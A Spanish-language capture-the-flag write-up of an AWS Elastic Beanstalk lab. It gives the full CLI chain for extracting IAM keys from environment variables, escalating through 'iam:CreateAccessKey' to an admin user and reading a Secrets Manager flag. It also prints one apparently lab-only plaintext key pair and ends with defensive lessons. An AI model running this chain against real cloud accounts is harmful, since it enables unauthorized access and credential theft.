# Writeup: Beanstalk (HackSmarter — Easy)

Beanstalk es una máquina **Easy** diseñada para simular un entorno AWS con Elastic Beanstalk. El recorrido comienza con un usuario IAM de bajo privilegio (`lab_low_priv_user`) que tiene permisos para describir aplicaciones, entornos y configuraciones de Elastic Beanstalk. A través de la configuración del entorno, se extraen credenciales de un usuario secundario (`lab_secondary_user`) que estaban almacenadas en variables de entorno. Este usuario tiene permisos para listar usuarios IAM y crear claves de acceso para cualquier usuario (`iam:CreateAccessKey`). Aprovechando esto, se crea una clave de acceso para el usuario `lab_admin_user`, que tiene permisos para acceder a Secrets Manager y recuperar la flag final.

---

## 🎯 Objetivo / Scope

El equipo de Hack Smarter ha sido contratado para realizar una prueba de penetración en AWS. El cliente utiliza **Elastic Beanstalk** para desplegar varias aplicaciones web y está preocupado por la seguridad de su configuración. Se han proporcionado credenciales de bajo nivel para un usuario IAM. Han colocado una bandera en **Secrets Manager**; si se recupera, demuestra un compromiso total.

---

## ⚙️ Fase 1: Configuración inicial de credenciales

Se nos proporcionan unas credenciales de AWS para un usuario IAM. Las configuramos en la CLI de AWS:

```bash
aws configure --profile beanstalk-user
```

**Datos proporcionados:**

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos nuestra identidad:

```bash
aws sts get-caller-identity --profile beanstalk-user
```

```json
{
    "UserId": "AIDAYR35WUFD5QPSUORN7",
    "Account": "588137275719",
    "Arn": "arn:aws:iam::588137275719:user/lab_low_priv_user"
}
```

Somos el usuario IAM `lab_low_priv_user` en la cuenta `588137275719`. Exportamos el perfil para no tener que especificarlo en cada comando:

```bash
export AWS_PROFILE=beanstalk-user
```

---

## 🔍 Fase 2: Enumeración de Elastic Beanstalk

### 2.1 Listado de aplicaciones

Elastic Beanstalk es un servicio de AWS que facilita el despliegue y escalado de aplicaciones web. Comenzamos enumerando las aplicaciones existentes:

```bash
aws elasticbeanstalk describe-applications
```

```json
{
    "Applications": [
        {
            "ApplicationArn": "arn:aws:elasticbeanstalk:us-east-1:588137275719:application/lab-app",
            "ApplicationName": "lab-app",
            "Description": "Elastic Beanstalk application for insecure secrets scenario",
            "DateCreated": "2026-08-06T23:57:53.248000+00:00",
            "DateUpdated": "2026-08-06T23:57:53.248000+00:00",
            "ConfigurationTemplates": [],
            "ResourceLifecycleConfig": {
                "VersionLifecycleConfig": {
                    "MaxCountRule": {
                        "Enabled": false,
                        "MaxCount": 200,
                        "DeleteSourceFromS3": false
                    },
                    "MaxAgeRule": {
                        "Enabled": false,
                        "MaxAgeInDays": 180,
                        "DeleteSourceFromS3": false
                    }
                }
            }
        }
    ]
}
```

Encontramos una aplicación llamada `lab-app`. La descripción indica que es un escenario de secretos inseguros, lo que nos da una pista sobre el objetivo.

### 2.2 Listado de entornos

Listamos los entornos asociados a la aplicación:

```bash
aws elasticbeanstalk describe-environments
```

```json
{
    "Environments": [
        {
            "EnvironmentName": "lab-env",
            "EnvironmentId": "e-megvwyrwf2",
            "ApplicationName": "lab-app",
            "SolutionStackName": "64bit Amazon Linux 2023 v4.13.5 running Python 3.11",
            "PlatformArn": "arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.13.5",
            "EndpointURL": "awseb-e-m-AWSEBLoa-1BNQ9P2WFL5D0-176350171.us-east-1.elb.amazonaws.com",
            "CNAME": "lab-env.eba-dg6mdzhe.us-east-1.elasticbeanstalk.com",
            "DateCreated": "2026-08-06T23:58:06.487000+00:00",
            "DateUpdated": "2026-08-07T00:00:49.658000+00:00",
            "Status": "Ready",
            "Health": "Grey",
            "Tier": {
                "Name": "WebServer",
                "Type": "Standard",
                "Version": "1.0"
            },
            "EnvironmentArn": "arn:aws:elasticbeanstalk:us-east-1:588137275719:environment/lab-app/lab-env"
        }
    ]
}
```

El entorno se llama `lab-env` y está ejecutando Python 3.11 en Amazon Linux 2023. Tenemos el CNAME (`lab-env.eba-dg6mdzhe.us-east-1.elasticbeanstalk.com`) y la URL del endpoint del load balancer.

### 2.3 Intento de enumeración de recursos del entorno

Intentamos describir los recursos del entorno para obtener más detalles (instancias EC2, grupos de Auto Scaling, etc.):

```bash
aws elasticbeanstalk describe-environment-resources --environment-name lab-env
```

```bash
aws: [ERROR]: An error occurred (InsufficientPrivilegesException) when calling the DescribeEnvironmentResources operation: User: arn:aws:iam::588137275719:user/lab_low_priv_user is not authorized to perform: autoscaling:DescribeAutoScalingGroups because no identity-based policy allows the autoscaling:DescribeAutoScalingGroups action
```

No tenemos permisos para describir los recursos del entorno. Sin embargo, tenemos los nombres de la aplicación y del entorno, lo que nos permite consultar su configuración.

### 2.4 Obtención de la configuración del entorno

Usamos `describe-configuration-settings` para obtener la configuración completa del entorno:

```bash
aws elasticbeanstalk describe-configuration-settings --application-name lab-app --environment-name lab-env
```

**Resultados relevantes del comando (extracto):**

```json
{
    "ConfigurationSettings": [
        {
            "ApplicationName": "lab-app",
            "EnvironmentName": "lab-env",
            "OptionSettings": [
                {
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "SSHSourceRestriction",
                    "Value": "tcp,22,22,0.0.0.0/0"
                },
                {
                    "ResourceName": "AWSEBEC2LaunchTemplate",
                    "Namespace": "aws:autoscaling:launchconfiguration",
                    "OptionName": "SecurityGroups",
                    "Value": "sg-0d605f490e681333a"
                },
                {
                    "Namespace": "aws:cloudformation:template:parameter",
                    "OptionName": "EnvironmentVariables",
                    "Value": "SECONDARY_SECRET_KEY=sdjbG73R/fs2/TQjXGKdCk+PLOHFxM6ZS8Ppmmfj,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIAW5EF2XMHRA652LM6"
                }
            ]
        }
    ]
}
```

**Análisis de la configuración:**

- **`SSHSourceRestriction`**: `tcp,22,22,0.0.0.0/0` — El puerto SSH (22) está abierto a toda Internet (0.0.0.0/0). Esto es una mala práctica de seguridad.
- **`SecurityGroups`**: `sg-0d605f490e681333a` — El grupo de seguridad utilizado por las instancias.
- **`EnvironmentVariables`**: Contiene variables de entorno que incluyen credenciales:
  - `SECONDARY_ACCESS_KEY=AKIAW5EF2XMHRA652LM6`
  - `SECONDARY_SECRET_KEY=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`

**Hallazgo crítico:** Las credenciales de un usuario IAM secundario están almacenadas en texto plano en las variables de entorno de Elastic Beanstalk. Esto es una práctica extremadamente insegura y nos permite escalar privilegios.

---

## 🔑 Fase 3: Configuración del perfil con credenciales secundarias

Creamos un nuevo perfil de AWS con las credenciales extraídas:

```bash
aws configure --profile lab-app-user
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos la identidad:

```bash
aws sts get-caller-identity --profile lab-app-user
```

```json
{
    "UserId": "AIDAW5EF2XMH5VFNDC34M",
    "Account": "474874559247",
    "Arn": "arn:aws:iam::474874559247:user/lab_secondary_user"
}
```

Ahora somos el usuario `lab_secondary_user` en la cuenta `474874559247`. Notamos que el ID de la cuenta ha cambiado de `588137275719` a `474874559247`. Esto indica que estamos en una cuenta AWS diferente, lo que sugiere un entorno de múltiples cuentas o una configuración de laboratorio.

---

## 🧩 Fase 4: Enumeración del usuario secundario

### 4.1 Obtención de información del usuario

```bash
aws iam get-user
```

```json
{
    "User": {
        "Path": "/",
        "UserName": "lab_secondary_user",
        "UserId": "AIDAW5EF2XMH5VFNDC34M",
        "Arn": "arn:aws:iam::474874559247:user/lab_secondary_user",
        "CreateDate": "2026-08-07T16:56:11+00:00"
    }
}
```

### 4.2 Políticas adjuntas al usuario

```bash
aws iam list-attached-user-policies --user-name lab_secondary_user
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "lab_secondary_policy",
            "PolicyArn": "arn:aws:iam::474874559247:policy/lab_secondary_policy"
        }
    ]
}
```

### 4.3 Obtención de la política

Obtenemos el documento de la política adjunta:

```bash
POLICY_ARN="arn:aws:iam::474874559247:policy/lab_secondary_policy"
aws iam get-policy --policy-arn "$POLICY_ARN"
```

```json
{
    "Policy": {
        "PolicyName": "lab_secondary_policy",
        "PolicyId": "ANPAW5EF2XMH53DYLBXZ7",
        "Arn": "arn:aws:iam::474874559247:policy/lab_secondary_policy",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2026-08-07T16:56:11+00:00",
        "UpdateDate": "2026-08-07T16:56:11+00:00",
        "Tags": []
    }
}
```

Obtenemos la versión `v1` de la política:

```bash
aws iam get-policy-version --policy-arn "$POLICY_ARN" --version-id v1
```

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:CreateAccessKey"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:ListRoles",
                        "iam:GetRole",
                        "iam:ListPolicies",
                        "iam:GetPolicy",
                        "iam:ListPolicyVersions",
                        "iam:GetPolicyVersion",
                        "iam:ListUsers",
                        "iam:GetUser",
                        "iam:ListGroups",
                        "iam:GetGroup",
                        "iam:ListAttachedUserPolicies",
                        "iam:ListAttachedRolePolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-08-07T16:56:11+00:00"
    }
}
```

**Análisis de la política:**

El usuario `lab_secondary_user` tiene dos conjuntos de permisos:

1. **`iam:CreateAccessKey`** sobre `*` — Puede crear claves de acceso para **cualquier usuario** IAM en la cuenta.
2. **Permisos de lectura de IAM** — Puede listar y obtener información sobre usuarios, roles, políticas, etc.

El permiso `iam:CreateAccessKey` es extremadamente peligroso, ya que permite generar credenciales para cualquier usuario, incluyendo aquellos con permisos de administrador.

---

## 🚀 Fase 5: Escalada de privilegios mediante `iam:CreateAccessKey`

### 5.1 Listado de usuarios

Primero, listamos todos los usuarios de IAM en la cuenta para identificar un objetivo con privilegios elevados:

```bash
aws iam list-users
```

```json
{
    "Users": [
        {
            "Path": "/",
            "UserName": "lab_admin_user",
            "UserId": "AIDAW5EF2XMH4QF3RT4LL",
            "Arn": "arn:aws:iam::474874559247:user/lab_admin_user",
            "CreateDate": "2026-08-07T16:56:11+00:00"
        },
        {
            "Path": "/",
            "UserName": "lab_low_priv_user",
            "UserId": "AIDAW5EF2XMH72K73O4NV",
            "Arn": "arn:aws:iam::474874559247:user/lab_low_priv_user",
            "CreateDate": "2026-08-07T16:56:11+00:00"
        },
        {
            "Path": "/",
            "UserName": "lab_secondary_user",
            "UserId": "AIDAW5EF2XMH5VFNDC34M",
            "Arn": "arn:aws:iam::474874559247:user/lab_secondary_user",
            "CreateDate": "2026-08-07T16:56:11+00:00"
        }
    ]
}
```

Encontramos tres usuarios. El usuario `lab_admin_user` probablemente tenga permisos de administrador, incluyendo acceso a Secrets Manager.

### 5.2 Creación de una clave de acceso para `lab_admin_user`

Usamos el permiso `iam:CreateAccessKey` para generar nuevas credenciales para el usuario administrador:

```bash
aws iam create-access-key --user-name lab_admin_user
```

```json
{
    "AccessKey": {
        "UserName": "lab_admin_user",
        "AccessKeyId": "[REDACTED]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED]",
        "CreateDate": "2026-08-07T17:52:12+00:00"
    }
}
```

**Explicación:** Este comando crea un nuevo par de claves de acceso para el usuario `lab_admin_user`. Las claves son válidas y pueden ser utilizadas para autenticarse como ese usuario.

### 5.3 Configuración del perfil de administrador

Creamos un nuevo perfil con las credenciales del administrador:

```bash
aws configure --profile admin-user
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

---

## 🏁 Fase 6: Acceso a Secrets Manager

### 6.1 Listado de secretos

Con el perfil de administrador, listamos los secretos en Secrets Manager:

```bash
aws secretsmanager list-secrets --profile admin-user
```

```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:474874559247:secret:lab_final_flag-DY37zw",
            "Name": "lab_final_flag",
            "LastChangedDate": "2026-08-07T12:56:11.241000-04:00",
            "LastAccessedDate": "2026-08-06T20:00:00-04:00",
            "SecretVersionsToStages": {
                "terraform-MFi9yqD3gRkCqp6x0DsyvOpTbD": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-08-07T12:56:11.052000-04:00"
        }
    ]
}
```

Encontramos un secreto llamado `lab_final_flag`.

### 6.2 Obtención del valor del secreto

Recuperamos el valor del secreto:

```bash
aws secretsmanager get-secret-value --secret-id lab_final_flag --profile admin-user
```

```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:474874559247:secret:lab_final_flag-DY37zw",
    "Name": "lab_final_flag",
    "VersionId": "terraform-MFi9yqD3gRkCqp6x0DsyvOpTbD",
    "SecretString": "FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-08-07T12:56:11.237000-04:00"
}
```

**Flag final:** `FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}`

Hemos completado el objetivo y recuperado la flag del Secrets Manager.

---

## 📌 Conclusión

Beanstalk es una máquina **Easy** que combina:

1. **Enumeración de Elastic Beanstalk** para descubrir aplicaciones y entornos.
2. **Extracción de credenciales** desde las variables de entorno de la configuración de Beanstalk.
3. **Configuración de un nuevo perfil** con las credenciales secundarias.
4. **Enumeración de permisos** del usuario secundario, identificando `iam:CreateAccessKey`.
5. **Listado de usuarios** para identificar un objetivo con privilegios (`lab_admin_user`).
6. **Creación de una clave de acceso** para el usuario administrador.
7. **Acceso a Secrets Manager** y recuperación de la flag final.

---

## 📚 Lecciones aprendidas


1. **Las variables de entorno de Elastic Beanstalk no deben contener credenciales**

   `describe-configuration-settings` reveló claves de acceso almacenadas en texto plano. Los secretos deben gestionarse mediante Secrets Manager o Parameter Store, evitando exponerlos en configuraciones, logs o repositorios.

2. **`iam:CreateAccessKey` es un permiso de alto riesgo**

   Conceder `iam:CreateAccessKey` sobre `Resource: "*"` permitió generar credenciales para otro usuario IAM. Este permiso debe evitarse o limitarse a usuarios concretos y a casos operativos justificados.

3. **La enumeración de IAM permitió identificar la ruta de escalada**

   Los permisos de lectura permitieron listar usuarios y políticas, confirmar los privilegios de `lab_admin_user` y validar que la creación de una nueva clave podía conducir a una identidad con acceso a Secrets Manager.

4. **El principio de mínimo privilegio no se aplicó correctamente**

   `lab_secondary_user` tenía permisos excesivos, ya que podía crear claves para cualquier usuario. La política debería restringirse mediante recursos concretos, condiciones y una separación clara entre tareas administrativas y operativas.

5. **Las claves de acceso deben gestionarse y monitorizarse cuidadosamente**

   La creación de una nueva clave para `lab_admin_user` demuestra el riesgo de las credenciales IAM permanentes. Deben preferirse roles y credenciales temporales, registrar la actividad con CloudTrail y detectar eventos como `CreateAccessKey`.

6. **La configuración de Elastic Beanstalk también reveló debilidades de red**

   La configuración permitía SSH desde `0.0.0.0/0`. Aunque no fue necesario explotar este punto, demuestra una exposición independiente que debe corregirse restringiendo SSH a redes o bastiones autorizados.

7. **El acceso a Secrets Manager confirmó el impacto**

   La recuperación de `lab_final_flag` demostró que la cadena permitió pasar de una identidad de bajo privilegio a un usuario con permisos suficientes para acceder a información sensible. IAM Access Analyzer puede ayudar a identificar y reducir permisos excesivos o no utilizados. 
